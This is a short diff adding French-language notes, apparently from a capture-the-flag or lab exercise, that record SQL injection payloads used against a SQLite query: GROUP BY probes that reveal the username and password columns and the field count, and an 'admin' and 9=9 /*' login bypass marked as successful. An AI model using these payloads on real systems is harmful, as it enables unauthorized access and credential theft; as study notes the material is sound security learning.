@@ -1,0 +1,9 @@
+SQLite3::query()
+
+Colonne trouvée grace à : "name' GROUP BY username;" :
+	-	username
+	-	password
+	
+On a trouvé qu'il y avait que 2 champs grace à "$id_non_existant' GROUP BY 12;"
+
+Reussi grace a : "admin' and 9=9 /*"
